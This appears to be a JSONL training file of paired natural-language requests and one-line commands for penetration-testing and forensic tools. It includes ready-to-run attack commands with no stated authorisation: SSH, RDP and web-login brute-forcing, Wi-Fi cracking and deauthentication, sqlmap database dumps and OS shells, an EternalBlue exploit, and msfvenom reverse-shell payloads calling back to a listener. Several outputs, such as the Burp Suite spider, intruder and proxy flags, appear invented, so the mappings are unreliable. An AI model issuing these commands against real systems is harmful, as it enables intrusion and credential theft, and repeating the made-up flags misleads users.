{"input": "Perform a stealth SYN scan and OS detection against 192.168.1.1.", "output": "nmap -sS -O 192.168.1.1"}
{"input": "Do a quiet SYN probe and fingerprint the operating system on 192.168.1.1.", "output": "nmap -sS -O 192.168.1.1"}
{"input": "Scan all TCP ports on 192.168.1.1 and detect service versions.", "output": "nmap -sV -p 1-65535 192.168.1.1"}
{"input": "Perform port scanning and service detection against 192.168.1.1 across the full TCP range.", "output": "nmap -sV -p 1-65535 192.168.1.1"}
{"input": "Set up a reverse TCP handler listening for callbacks to 192.168.1.100.", "output": "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100; run'"}
{"input": "Prepare exploit handling and payload delivery targeting 192.168.1.100 for incoming sessions.", "output": "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100; run'"}
{"input": "Crack the wireless network key from capture.cap using wordlist.txt.", "output": "aircrack-ng -w wordlist.txt capture.cap"}
{"input": "Recover a WEP/WPA passphrase by testing wordlist.txt against capture.cap.", "output": "aircrack-ng -w wordlist.txt capture.cap"}
{"input": "Brute-force FTP credentials on ftp://192.168.1.1 using a password list.", "output": "hydra -l admin -P passwords.txt ftp://192.168.1.1"}
{"input": "Perform credential brute-forcing against ftp://192.168.1.1 over FTP with a wordlist.", "output": "hydra -l admin -P passwords.txt ftp://192.168.1.1"}
{"input": "Launch Burp Suite from burpsuite.jar for web application security testing.", "output": "java -jar burpsuite.jar"}
{"input": "Start web vulnerability testing by opening burpsuite.jar.", "output": "java -jar burpsuite.jar"}
{"input": "Enumerate databases on the web application at http://example.com.", "output": "sqlmap -u http://example.com --dbs"}
{"input": "Perform SQL injection testing against http://example.com to list its databases.", "output": "sqlmap -u http://example.com --dbs"}
{"input": "Capture and analyze TCP port 80 traffic on eth0.", "output": "wireshark -i eth0 -f 'tcp port 80'"}
{"input": "Perform network traffic analysis on eth0 for TCP port 80.", "output": "wireshark -i eth0 -f 'tcp port 80'"}
{"input": "Scan http://example.com for web server vulnerabilities and misconfigurations.", "output": "nikto -h http://example.com"}
{"input": "Perform web server vulnerability scanning against http://example.com.", "output": "nikto -h http://example.com"}
{"input": "Crack MD5 hashes in hash.txt using the wordlist wordlist.txt.", "output": "hashcat -m 0 -a 0 hash.txt wordlist.txt"}
{"input": "Perform high-performance hash cracking against hash.txt with wordlist.txt.", "output": "hashcat -m 0 -a 0 hash.txt wordlist.txt"}
{"input": "Crack the password hashes in hash.txt using the rockyou.txt wordlist.", "output": "john --wordlist=rockyou.txt hash.txt"}
{"input": "Run a wordlist attack against hash.txt with rockyou.txt.", "output": "john --wordlist=rockyou.txt hash.txt"}
{"input": "Enumerate database tables via SQL injection on http://example.com.", "output": "sqlmap -u http://example.com --tables"}
{"input": "List all tables uncovered through SQLi on http://example.com.", "output": "sqlmap -u http://example.com --tables"}
{"input": "Enumerate directories and files on http://example.com using the wordlist wordlist.txt.", "output": "dirb http://example.com wordlist.txt"}
{"input": "Brute-force web paths on http://example.com with wordlist.txt.", "output": "dirb http://example.com wordlist.txt"}
{"input": "Enumerate SMB versions across 192.168.1.0/24.", "output": "msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS 192.168.1.0/24; run'"}
{"input": "Perform service enumeration of SMB on 192.168.1.0/24.", "output": "msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS 192.168.1.0/24; run'"}
{"input": "Enumerate WordPress users on http://example.com.", "output": "wpscan --url http://example.com --enumerate u"}
{"input": "Perform WordPress vulnerability scanning against http://example.com to list user accounts.", "output": "wpscan --url http://example.com --enumerate u"}
{"input": "Enable monitor mode on the wireless interface wlan0 for packet capture.", "output": "airmon-ng start wlan0"}
{"input": "Prepare wlan0 for wireless packet capturing by switching it to monitor mode.", "output": "airmon-ng start wlan0"}
{"input": "Brute-force SSH logins against 192.168.1.1 using username and password lists.", "output": "hydra -L users.txt -P passwords.txt ssh://192.168.1.1"}
{"input": "Perform SSH brute forcing on 192.168.1.1 to discover valid credentials.", "output": "hydra -L users.txt -P passwords.txt ssh://192.168.1.1"}
{"input": "Scan UDP ports on 192.168.1.1.", "output": "nmap -sU -p 1-1000 192.168.1.1"}
{"input": "Probe 192.168.1.1 for UDP services.", "output": "nmap -sU -p 1-1000 192.168.1.1"}
{"input": "Perform web enumeration against 192.168.1.1 to discover directories and files with Nmap scripts.", "output": "nmap --script http-enum 192.168.1.1"}
{"input": "Probe 192.168.1.1 for web content and folder listings using Nmap script-based enumeration.", "output": "nmap --script http-enum 192.168.1.1"}
{"input": "Brute-force the HTTP form-based login at /login.", "output": "hydra -l admin -P passwords.txt http-post-form '/login:username=^USER^&password=^PASS^:Invalid'"}
{"input": "Attempt web form brute-forcing against the /login endpoint.", "output": "hydra -l admin -P passwords.txt http-post-form '/login:username=^USER^&password=^PASS^:Invalid'"}
{"input": "Perform advanced SQL injection testing on http://example.com using POST data id=1 with detection level 3.", "output": "sqlmap -u http://example.com --data 'id=1' --level 3"}
{"input": "Test http://example.com for SQLi via POST id=1 and raise detection sensitivity to level 3.", "output": "sqlmap -u http://example.com --data 'id=1' --level 3"}
{"input": "Attempt remote code execution on 192.168.1.10 by exploiting Windows SMB with EternalBlue.", "output": "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOST 192.168.1.10; run'"}
{"input": "Exploit EternalBlue against Windows SMB on 192.168.1.10 to gain RCE.", "output": "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOST 192.168.1.10; run'"}
{"input": "Start Burp Suite with a proxy listener at 127.0.0.1:8080.", "output": "java -jar burpsuite.jar --proxy 127.0.0.1:8080"}
{"input": "Intercept web traffic through the listener on 127.0.0.1:8080.", "output": "java -jar burpsuite.jar --proxy 127.0.0.1:8080"}
{"input": "Capture packets from the access point with BSSID 00:11:22:33:44:55 for wireless traffic analysis.", "output": "airodump-ng wlan0mon --bssid 00:11:22:33:44:55"}
{"input": "Collect frames targeting BSSID 00:11:22:33:44:55 to analyze wireless traffic.", "output": "airodump-ng wlan0mon --bssid 00:11:22:33:44:55"}
{"input": "Crack NTLM hashes contained in hash.txt.", "output": "john --format=nt hash.txt"}
{"input": "Perform NTLM hash cracking against hash.txt.", "output": "john --format=nt hash.txt"}
{"input": "Generate a Windows reverse TCP Meterpreter payload connecting back to 192.168.1.100:4444 and save it as payload.exe.", "output": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe"}
{"input": "Create a Windows Meterpreter reverse_tcp payload for 192.168.1.100 on port 4444, output to payload.exe.", "output": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe"}
{"input": "Brute-force NTLM hashes in hash.txt using a 4-digit mask.", "output": "hashcat -m 1000 -a 3 hash.txt ?d?d?d?d"}
{"input": "Perform mask-based hash cracking against hash.txt with a four-digit pattern.", "output": "hashcat -m 1000 -a 3 hash.txt ?d?d?d?d"}
{"input": "Start Wireshark and immediately capture traffic on eth0 for real-time analysis.", "output": "wireshark -i eth0 -k"}
{"input": "Begin a live packet capture on eth0 with Wireshark starting right away.", "output": "wireshark -i eth0 -k"}
{"input": "Perform non-recursive directory enumeration against http://example.com.", "output": "dirb http://example.com -r"}
{"input": "Brute-force directories on http://example.com without recursion.", "output": "dirb http://example.com -r"}
{"input": "Scan the HTTPS server at https://example.com for vulnerabilities.", "output": "nikto -h https://example.com -ssl"}
{"input": "Perform web server scanning against https://example.com to find security issues.", "output": "nikto -h https://example.com -ssl"}
{"input": "Exploit SQL injection at http://example.com to obtain an OS shell.", "output": "sqlmap -u http://example.com --os-shell"}
{"input": "Attempt to escalate SQLi on http://example.com into an operating system shell.", "output": "sqlmap -u http://example.com --os-shell"}
{"input": "Perform an aggressive scan with OS and service detection on 192.168.1.1.", "output": "nmap -A 192.168.1.1"}
{"input": "Do comprehensive host discovery against 192.168.1.1, including OS and service details.", "output": "nmap -A 192.168.1.1"}
{"input": "Enumerate web directories on 192.168.1.1.", "output": "msfconsole -q -x 'use auxiliary/scanner/http/dir_scanner; set RHOSTS 192.168.1.1; run'"}
{"input": "Scan 192.168.1.1 for accessible web paths.", "output": "msfconsole -q -x 'use auxiliary/scanner/http/dir_scanner; set RHOSTS 192.168.1.1; run'"}
{"input": "Aggressively enumerate WordPress plugins on http://example.com.", "output": "wpscan --url http://example.com --plugins-detection aggressive"}
{"input": "Run an aggressive WordPress plugin scan against http://example.com.", "output": "wpscan --url http://example.com --plugins-detection aggressive"}
{"input": "Brute-force RDP credentials for root at rdp://192.168.1.1 using passwords.txt.", "output": "hydra -l root -P passwords.txt rdp://192.168.1.1"}
{"input": "Perform RDP brute-forcing against rdp://192.168.1.1, testing the root account with passwords.txt.", "output": "hydra -l root -P passwords.txt rdp://192.168.1.1"}
{"input": "Brute-force SMTP credentials on smtp://192.168.1.1 using the admin username and passwords.txt.", "output": "hydra -l admin -P passwords.txt smtp://192.168.1.1"}
{"input": "Attempt SMTP login cracking on smtp://192.168.1.1 for admin with the passwords.txt wordlist.", "output": "hydra -l admin -P passwords.txt smtp://192.168.1.1"}
{"input": "Crack the WPA2 passphrase from capture.cap using wordlist.txt.", "output": "aircrack-ng -a 2 -w wordlist.txt capture.cap"}
{"input": "Recover the WPA2 key from the captured packets in capture.cap with the wordlist wordlist.txt.", "output": "aircrack-ng -a 2 -w wordlist.txt capture.cap"}
{"input": "Crack the SHA-512 crypt hashes in hash.txt.", "output": "john --format=sha512crypt hash.txt"}
{"input": "Perform crypt hash cracking on hash.txt to recover passwords.", "output": "john --format=sha512crypt hash.txt"}
{"input": "Run vulnerability scanning scripts against 192.168.1.1.", "output": "nmap --script vuln 192.168.1.1"}
{"input": "Perform a vulnerability scan on 192.168.1.1.", "output": "nmap --script vuln 192.168.1.1"}
{"input": "Crawl http://example.com using Burp Suite\u2019s spider.", "output": "java -jar burpsuite.jar --spider http://example.com"}
{"input": "Perform website crawling against http://example.com to map its pages.", "output": "java -jar burpsuite.jar --spider http://example.com"}
{"input": "Crack the SHA-512 crypt hashes in hash.txt using the wordlist wordlist.txt.", "output": "hashcat -m 1800 -a 0 hash.txt wordlist.txt"}
{"input": "Perform crypt hash cracking against hash.txt with wordlist.txt as the candidate list.", "output": "hashcat -m 1800 -a 0 hash.txt wordlist.txt"}
{"input": "Brute-force PHP files on http://example.com to uncover hidden endpoints.", "output": "dirb http://example.com -X .php"}
{"input": "Enumerate PHP file extensions on http://example.com.", "output": "dirb http://example.com -X .php"}
{"input": "Analyze HTTP request traffic in capture.pcap.", "output": "wireshark -r capture.pcap -Y 'http.request'"}
{"input": "Review HTTP requests contained in capture.pcap for packet analysis.", "output": "wireshark -r capture.pcap -Y 'http.request'"}
{"input": "Generate a Linux reverse TCP Meterpreter payload that connects back to 192.168.1.100 on port 4444.", "output": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o payload.elf"}
{"input": "Create a Meterpreter reverse shell payload for Linux, configured to callback to 192.168.1.100:4444.", "output": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o payload.elf"}
{"input": "Run default Nmap scripts against 192.168.1.1 for service enumeration.", "output": "nmap -sC 192.168.1.1"}
{"input": "Enumerate services on 192.168.1.1 using the default script set.", "output": "nmap -sC 192.168.1.1"}
{"input": "Scan for FTP service versions on 192.168.1.0/24.", "output": "msfconsole -q -x 'use auxiliary/scanner/ftp/ftp_version; set RHOSTS 192.168.1.0/24; run'"}
{"input": "Enumerate FTP on 192.168.1.0/24 and collect banner versions.", "output": "msfconsole -q -x 'use auxiliary/scanner/ftp/ftp_version; set RHOSTS 192.168.1.0/24; run'"}
{"input": "Automate SQL injection against http://example.com and dump the database contents.", "output": "sqlmap -u http://example.com --batch --dump"}
{"input": "Perform database extraction from http://example.com via automated SQL injection.", "output": "sqlmap -u http://example.com --batch --dump"}
{"input": "Perform a targeted vulnerability scan against http://example.com.", "output": "nikto -h http://example.com -Tuning 4"}
{"input": "Scan http://example.com for specific web server vulnerabilities.", "output": "nikto -h http://example.com -Tuning 4"}
{"input": "Extract embedded files and components from firmware.bin for analysis.", "output": "binwalk -e firmware.bin"}
{"input": "Perform firmware analysis by pulling out contained files from firmware.bin.", "output": "binwalk -e firmware.bin"}
{"input": "Send deauthentication packets to the wireless AP at 00:11:22:33:44:55.", "output": "aireplay-ng --deauth 10 -a 00:11:22:33:44:55 wlan0mon"}
{"input": "Execute a wireless deauthentication attack against 00:11:22:33:44:55.", "output": "aireplay-ng --deauth 10 -a 00:11:22:33:44:55 wlan0mon"}
{"input": "Attempt a Telnet login brute-force against 192.168.1.1.", "output": "hydra -l admin -P passwords.txt telnet://192.168.1.1"}
{"input": "Brute-force Telnet credentials on telnet://192.168.1.1.", "output": "hydra -l admin -P passwords.txt telnet://192.168.1.1"}
{"input": "Recover files by type from the disk image image.dd and write them to output/.", "output": "foremost -t all -i image.dd -o output/"}
{"input": "Carve file data from image.dd and save all recovered items under output/.", "output": "foremost -t all -i image.dd -o output/"}
{"input": "Identify the memory profile of memory.dump to support memory forensics.", "output": "volatility -f memory.dump imageinfo"}
{"input": "Determine the correct profile for memory.dump before deeper analysis.", "output": "volatility -f memory.dump imageinfo"}
{"input": "Create a forensic disk image of /dev/sda and write it to image.dd.", "output": "dd if=/dev/sda of=image.dd bs=4M"}
{"input": "Acquire a disk imaging capture from the physical drive /dev/sda, saving the output as image.dd.", "output": "dd if=/dev/sda of=image.dd bs=4M"}
{"input": "Recover lost partitions on /dev/sda and attempt filesystem repair.", "output": "testdisk /dev/sda"}
{"input": "Perform partition recovery on /dev/sda to restore damaged or missing volumes.", "output": "testdisk /dev/sda"}
{"input": "Recover deleted files from image.dd and save the results into output/.", "output": "tsk_recover -a image.dd output/"}
{"input": "Perform file recovery on image.dd, writing recovered files to output/.", "output": "tsk_recover -a image.dd output/"}
{"input": "List running processes from memory.dump for memory forensics.", "output": "volatility -f memory.dump --profile=Win7SP1x64 pslist"}
{"input": "During memory forensics, enumerate processes present in memory.dump.", "output": "volatility -f memory.dump --profile=Win7SP1x64 pslist"}
{"input": "Extract embedded metadata from evidence.jpg.", "output": "exiftool evidence.jpg"}
{"input": "Analyze the metadata contained in evidence.jpg.", "output": "exiftool evidence.jpg"}
{"input": "Carve files from the disk image image.dd using the configuration scalpel.conf, writing recovered data to output/.", "output": "scalpel -c scalpel.conf -o output/ image.dd"}
{"input": "Extract files from image.dd per scalpel.conf and store the carved results in output/.", "output": "scalpel -c scalpel.conf -o output/ image.dd"}
{"input": "Extract printable strings from memory.dump and save them to strings.txt.", "output": "strings memory.dump > strings.txt"}
{"input": "Pull human-readable data from memory.dump, outputting the results into strings.txt.", "output": "strings memory.dump > strings.txt"}
{"input": "Acquire a forensic disk image of /dev/sda via a GUI, saving the result to /case1/image.dd.", "output": "guymager -o /case1/image.dd /dev/sda"}
{"input": "Perform disk imaging on /dev/sda and store the image file at /case1/image.dd using a graphical workflow.", "output": "guymager -o /case1/image.dd /dev/sda"}
{"input": "Extract emails and URLs from the disk image image.dd.", "output": "bulk_extractor -o output/ image.dd"}
{"input": "Perform data extraction on image.dd to pull bulk artifacts.", "output": "bulk_extractor -o output/ image.dd"}
{"input": "Recover files from /dev/sda using signature-based carving.", "output": "photorec /dev/sda"}
{"input": "Carve files from the disk at /dev/sda by scanning for known signatures.", "output": "photorec /dev/sda"}
{"input": "Analyze firmware.bin for embedded signatures.", "output": "binwalk --signature firmware.bin"}
{"input": "Conduct firmware analysis on firmware.bin to detect embedded signature patterns.", "output": "binwalk --signature firmware.bin"}
{"input": "Create a disk image of /dev/sda to image.dd with hash verification.", "output": "dcfldd if=/dev/sda of=image.dd hash=sha256"}
{"input": "Image /dev/sda into image.dd and verify integrity via a hash.", "output": "dcfldd if=/dev/sda of=image.dd hash=sha256"}
{"input": "Analyze network connections from the memory dump at memory.dump.", "output": "volatility -f memory.dump --profile=Win7SP1x64 netscan"}
{"input": "Perform network forensics on memory.dump to identify active connections.", "output": "volatility -f memory.dump --profile=Win7SP1x64 netscan"}
{"input": "List all files and directories contained in the disk image image.dd.", "output": "fls -r image.dd"}
{"input": "Perform filesystem analysis by enumerating file and folder entries within image.dd.", "output": "fls -r image.dd"}
{"input": "Start the Autopsy web server on port 8080 for remote case analysis.", "output": "autopsy -p 8080"}
{"input": "Bring up the Autopsy service on port 8080 to support disk image analysis.", "output": "autopsy -p 8080"}
{"input": "Display the partition table of image.dd.", "output": "mmls image.dd"}
{"input": "Run partition analysis on image.dd to list all partitions.", "output": "mmls image.dd"}
{"input": "Recover data from the failing /dev/sda to image.dd with error handling, recording progress in logfile.", "output": "ddrescue -f /dev/sda image.dd logfile"}
{"input": "Perform disk recovery on /dev/sda, creating image.dd and tracking errors in logfile.", "output": "ddrescue -f /dev/sda image.dd logfile"}
{"input": "Recover partitions on /dev/sda with logging enabled.", "output": "testdisk /log /dev/sda"}
{"input": "Perform partition recovery on /dev/sda and save logs.", "output": "testdisk /log /dev/sda"}
{"input": "Perform memory forensics to display command-line arguments of processes in memory.dump with the Win7SP1x64 profile.", "output": "volatility -f memory.dump --profile=Win7SP1x64 cmdline"}
{"input": "List process command-line strings from memory.dump, specifying the Win7SP1x64 profile for parsing.", "output": "volatility -f memory.dump --profile=Win7SP1x64 cmdline"}
{"input": "Export image metadata from evidence.jpg into CSV and save it as metadata.csv.", "output": "exiftool -csv evidence.jpg > metadata.csv"}
{"input": "For metadata analysis, convert metadata of evidence.jpg to a CSV file named metadata.csv.", "output": "exiftool -csv evidence.jpg > metadata.csv"}
{"input": "Recover JPEG files from the disk image image.dd and save them into output/.", "output": "foremost -t jpg -i image.dd -o output/"}
{"input": "Perform file recovery of JPGs from image.dd, writing recovered files to output/.", "output": "foremost -t jpg -i image.dd -o output/"}
{"input": "Recover files from /dev/sda to output/.", "output": "photorec /d output/ /dev/sda"}
{"input": "Perform file recovery on /dev/sda and save everything under output/.", "output": "photorec /d output/ /dev/sda"}
{"input": "Create a disk image from /dev/sda to image.dd and record hashes in hash.txt.", "output": "dcfldd if=/dev/sda of=image.dd hashlog=hash.txt"}
{"input": "Perform disk imaging on /dev/sda, saving the image as image.dd and writing the hash log to hash.txt.", "output": "dcfldd if=/dev/sda of=image.dd hashlog=hash.txt"}
{"input": "Recursively analyze the firmware image firmware.bin.", "output": "binwalk -M firmware.bin"}
{"input": "Perform a deep firmware analysis on firmware.bin.", "output": "binwalk -M firmware.bin"}
{"input": "Acquire a disk image using the configuration file at /case1/config.xml.", "output": "guymager -c /case1/config.xml"}
{"input": "Perform disk imaging guided by /case1/config.xml.", "output": "guymager -c /case1/config.xml"}
{"input": "From memory.dump, dump the memory of process PID 1234 for memory forensics.", "output": "volatility -f memory.dump --profile=Win7SP1x64 memdump -p 1234"}
{"input": "Perform a specific process memory dump of PID 1234 from memory.dump.", "output": "volatility -f memory.dump --profile=Win7SP1x64 memdump -p 1234"}
{"input": "Display filesystem details for image.dd.", "output": "fsstat image.dd"}
{"input": "Perform filesystem analysis on image.dd to review its structure.", "output": "fsstat image.dd"}
{"input": "Perform metadata analysis on evidence.pdf, extracting all metadata including unknown tags.", "output": "exiftool -a -u evidence.pdf"}
{"input": "Analyze evidence.pdf and pull every metadata field, including unknown tags.", "output": "exiftool -a -u evidence.pdf"}
{"input": "Recover data from /dev/sda to image.dd with multiple retries, logging to logfile.", "output": "ddrescue -r 3 /dev/sda image.dd logfile"}
{"input": "Perform disk recovery on /dev/sda, writing the image to image.dd and progress to logfile with retries.", "output": "ddrescue -r 3 /dev/sda image.dd logfile"}
{"input": "Recover PDF files from the disk image image.dd and save them into output/.", "output": "foremost -t pdf -i image.dd -o output/"}
{"input": "Carve PDFs from image.dd and write the recovered files to output/.", "output": "foremost -t pdf -i image.dd -o output/"}
{"input": "Extract email addresses from the disk image image.dd and write findings to output/.", "output": "bulk_extractor -E email -o output/ image.dd"}
{"input": "Perform data extraction of emails from image.dd, saving the results in output/.", "output": "bulk_extractor -E email -o output/ image.dd"}
{"input": "Open the existing Autopsy case file at /case1/case.aut.", "output": "autopsy -c /case1/case.aut"}
{"input": "Load the disk image analysis case from /case1/case.aut.", "output": "autopsy -c /case1/case.aut"}
{"input": "Extract the file at inode 12345 from the disk image image.dd and save it to file.txt.", "output": "icat image.dd 12345 > file.txt"}
{"input": "From image.dd, carve the inode 12345 file and write the output as file.txt.", "output": "icat image.dd 12345 > file.txt"}
{"input": "Extract URLs from the disk image image.dd and save results to output/.", "output": "bulk_extractor -E url -o output/ image.dd"}
{"input": "Perform data extraction of URLs on image.dd, writing the findings to output/.", "output": "bulk_extractor -E url -o output/ image.dd"}
{"input": "Analyze /dev/sda to recover lost partitions.", "output": "testdisk /dev/sda /analyse"}
{"input": "Scan /dev/sda for partition structures to support recovery.", "output": "testdisk /dev/sda /analyse"}
{"input": "List registry hives present in memory.dump.", "output": "volatility -f memory.dump --profile=Win7SP1x64 hivelist"}
{"input": "Perform memory forensics on memory.dump to identify its registry hives.", "output": "volatility -f memory.dump --profile=Win7SP1x64 hivelist"}
{"input": "Carve headerless files from image.dd and write the recovered data to output/.", "output": "scalpel -b -o output/ image.dd"}
{"input": "Recover files without headers from the disk image image.dd, saving results in output/.", "output": "scalpel -b -o output/ image.dd"}
{"input": "Create a disk image of /dev/sda to image.dd with progress shown.", "output": "dcfldd if=/dev/sda of=image.dd status=on"}
{"input": "Image /dev/sda into image.dd and display ongoing progress.", "output": "dcfldd if=/dev/sda of=image.dd status=on"}
{"input": "Recover files from /dev/sda with logging enabled, writing the recovered data to output/.", "output": "photorec /log /d output/ /dev/sda"}
{"input": "Perform file recovery on /dev/sda, enable logs and save results under output/.", "output": "photorec /log /d output/ /dev/sda"}
{"input": "Extract the filesystem from firmware.bin for firmware analysis.", "output": "binwalk -y filesystem firmware.bin"}
{"input": "Analyze firmware.bin and recover its filesystem.", "output": "binwalk -y filesystem firmware.bin"}
{"input": "Acquire a disk image from /dev/sda and log the process.", "output": "guymager -l logfile /dev/sda"}
{"input": "Perform disk imaging of /dev/sda and ensure the acquisition is logged.", "output": "guymager -l logfile /dev/sda"}
{"input": "Extract slack space from image.dd and write the output to slack_space.dat.", "output": "blkls image.dd > slack_space.dat"}
{"input": "Dump file slack from image.dd into slack_space.dat for analysis.", "output": "blkls image.dd > slack_space.dat"}
{"input": "Scan for file objects in memory.dump.", "output": "volatility -f memory.dump --profile=Win7SP1x64 filescan"}
{"input": "Perform memory forensics on memory.dump to locate file artifacts.", "output": "volatility -f memory.dump --profile=Win7SP1x64 filescan"}
{"input": "Export image metadata from evidence.jpg to metadata.json for analysis.", "output": "exiftool -json evidence.jpg > metadata.json"}
{"input": "Create a JSON metadata report of evidence.jpg and save it as metadata.json.", "output": "exiftool -json evidence.jpg > metadata.json"}
{"input": "Enumerate databases on the web application at http://example.com.", "output": "sqlmap -u http://example.com --dbs"}
{"input": "Perform SQL injection testing against http://example.com to list available databases.", "output": "sqlmap -u http://example.com --dbs"}
{"input": "Recover DOCX documents from the disk image image.dd and save them under output/.", "output": "foremost -t docx -i image.dd -o output/"}
{"input": "Extract any .docx files contained in image.dd, writing the recovered files to output/.", "output": "foremost -t docx -i image.dd -o output/"}
{"input": "Enumerate database tables via SQL injection at http://example.com.", "output": "sqlmap -u http://example.com --tables"}
{"input": "List all tables by exploiting SQL injection on http://example.com.", "output": "sqlmap -u http://example.com --tables"}
{"input": "Perform disk recovery from /dev/sda into image.dd and record progress in logfile, without retrying bad sectors.", "output": "ddrescue -n /dev/sda image.dd logfile"}
{"input": "Create an image from /dev/sda to image.dd for recovery, logging to logfile, and skip reattempts on bad sectors.", "output": "ddrescue -n /dev/sda image.dd logfile"}
{"input": "Probe http://example.com for SQL injection using POST data with an increased detection level.", "output": "sqlmap -u http://example.com --data 'id=1' --level 3"}
{"input": "Perform advanced SQL injection testing against http://example.com, including checks that consider POST parameters and elevated detection depth.", "output": "sqlmap -u http://example.com --data 'id=1' --level 3"}
{"input": "Launch Burp Suite to begin web vulnerability testing.", "output": "java -jar burpsuite.jar"}
{"input": "Start Burp Suite for web application security testing.", "output": "java -jar burpsuite.jar"}
{"input": "Perform a targeted vulnerability scan on http://example.com to find specific web server flaws.", "output": "nikto -h http://example.com -Tuning 4"}
{"input": "Assess http://example.com for specific web server vulnerabilities with a focused scan.", "output": "nikto -h http://example.com -Tuning 4"}
{"input": "Crawl http://example.com with Burp Suite\u2019s spider to map its content.", "output": "java -jar burpsuite.jar --spider http://example.com"}
{"input": "Perform website crawling on http://example.com to discover pages and links.", "output": "java -jar burpsuite.jar --spider http://example.com"}
{"input": "Scan http://example.com for web server vulnerabilities and misconfigurations.", "output": "nikto -h http://example.com"}
{"input": "Perform a web server vulnerability scan against http://example.com.", "output": "nikto -h http://example.com"}
{"input": "Scan https://example.com for web server vulnerabilities over HTTPS.", "output": "nikto -h https://example.com -ssl"}
{"input": "Perform a web server assessment against https://example.com to find vulnerabilities.", "output": "nikto -h https://example.com -ssl"}
{"input": "Enumerate directories on http://example.com using the wordlist wordlist.txt.", "output": "dirb http://example.com wordlist.txt"}
{"input": "Brute-force hidden files and folders on http://example.com with wordlist.txt.", "output": "dirb http://example.com wordlist.txt"}
{"input": "Start Burp Suite with its proxy listening on 127.0.0.1:8080 to intercept web traffic.", "output": "java -jar burpsuite.jar --proxy 127.0.0.1:8080"}
{"input": "Launch the proxy listener on 127.0.0.1:8080 in Burp Suite for web traffic interception.", "output": "java -jar burpsuite.jar --proxy 127.0.0.1:8080"}
{"input": "Perform a non-recursive directory brute-force on http://example.com.", "output": "dirb http://example.com -r"}
{"input": "Enumerate directories on http://example.com without recursion.", "output": "dirb http://example.com -r"}
{"input": "Brute-force PHP files on http://example.com.", "output": "dirb http://example.com -X .php"}
{"input": "Enumerate .php paths on the web server at http://example.com.", "output": "dirb http://example.com -X .php"}
{"input": "Enumerate WordPress users on http://example.com.", "output": "wpscan --url http://example.com --enumerate u"}
{"input": "Perform WordPress vulnerability scanning focused on listing users at http://example.com.", "output": "wpscan --url http://example.com --enumerate u"}
{"input": "Attempt to gain an OS shell on http://example.com through SQL injection.", "output": "sqlmap -u http://example.com --os-shell"}
{"input": "Exploit SQL injection on http://example.com to obtain an operating system shell.", "output": "sqlmap -u http://example.com --os-shell"}
{"input": "Automate SQL injection against http://example.com and dump its database contents.", "output": "sqlmap -u http://example.com --batch --dump"}
{"input": "Perform database extraction from http://example.com and dump the contents.", "output": "sqlmap -u http://example.com --batch --dump"}
{"input": "Identify technologies running on http://example.com as part of web reconnaissance.", "output": "whatweb http://example.com"}
{"input": "Profile the tech stack of the site at http://example.com during recon.", "output": "whatweb http://example.com"}
{"input": "Brute-force DNS to find subdomains for example.com using the subdomains.txt wordlist.", "output": "gobuster dns -d example.com -w subdomains.txt"}
{"input": "Perform subdomain enumeration on example.com with a DNS wordlist at subdomains.txt.", "output": "gobuster dns -d example.com -w subdomains.txt"}
{"input": "Perform directory enumeration against http://example.com.", "output": "gobuster dir -u http://example.com -w wordlist.txt"}
{"input": "Brute-force hidden directories on http://example.com.", "output": "gobuster dir -u http://example.com -w wordlist.txt"}
{"input": "Aggressively detect WordPress plugins on http://example.com.", "output": "wpscan --url http://example.com --plugins-detection aggressive"}
{"input": "Run a WordPress plugin scan against http://example.com with aggressive detection.", "output": "wpscan --url http://example.com --plugins-detection aggressive"}
{"input": "Perform aggressive scanning to identify website technologies on http://example.com.", "output": "whatweb -a 3 http://example.com"}
{"input": "Conduct web reconnaissance of http://example.com to fingerprint the site's technology stack.", "output": "whatweb -a 3 http://example.com"}
{"input": "Perform a comprehensive CGI scan against the web server at http://example.com.", "output": "nikto -h http://example.com -C all"}
{"input": "Thoroughly scan the web server at http://example.com for CGI-related issues.", "output": "nikto -h http://example.com -C all"}
{"input": "Test the web forms at http://example.com for SQL injection vulnerabilities.", "output": "sqlmap -u http://example.com --forms"}
{"input": "Try to detect and exploit SQLi in form inputs on http://example.com.", "output": "sqlmap -u http://example.com --forms"}
{"input": "Crawl http://example.com to identify potential SQL injection points.", "output": "sqlmap -u http://example.com --crawl 2"}
{"input": "Scan http://example.com for SQL injection by crawling its pages.", "output": "sqlmap -u http://example.com --crawl 2"}
{"input": "Use Burp Suite Intruder to perform automated attacks against http://example.com.", "output": "java -jar burpsuite.jar --intruder http://example.com"}
{"input": "Exploit web vulnerabilities on http://example.com using an automated Intruder attack.", "output": "java -jar burpsuite.jar --intruder http://example.com"}
{"input": "Scan the WordPress site at http://example.com for vulnerabilities using an API token.", "output": "wpscan --url http://example.com --api-token TOKEN"}
{"input": "Run a WordPress security assessment against http://example.com with token-enabled features.", "output": "wpscan --url http://example.com --api-token TOKEN"}
{"input": "Brute-force the HTTP login at /login for the admin user with passwords.txt.", "output": "hydra -l admin -P passwords.txt http-post-form '/login:username=^USER^&password=^PASS^:Invalid'"}
{"input": "Perform web form brute-forcing against /login using admin and the passwords.txt wordlist.", "output": "hydra -l admin -P passwords.txt http-post-form '/login:username=^USER^&password=^PASS^:Invalid'"}
{"input": "Brute-force virtual hosts on http://example.com using the subdomains.txt wordlist.", "output": "gobuster vhost -u http://example.com -w subdomains.txt"}
{"input": "Perform virtual host enumeration against http://example.com with candidates from subdomains.txt.", "output": "gobuster vhost -u http://example.com -w subdomains.txt"}
{"input": "Enumerate WordPress themes on http://example.com.", "output": "wpscan --url http://example.com --enumerate t"}
{"input": "Scan http://example.com to identify installed WordPress themes.", "output": "wpscan --url http://example.com --enumerate t"}
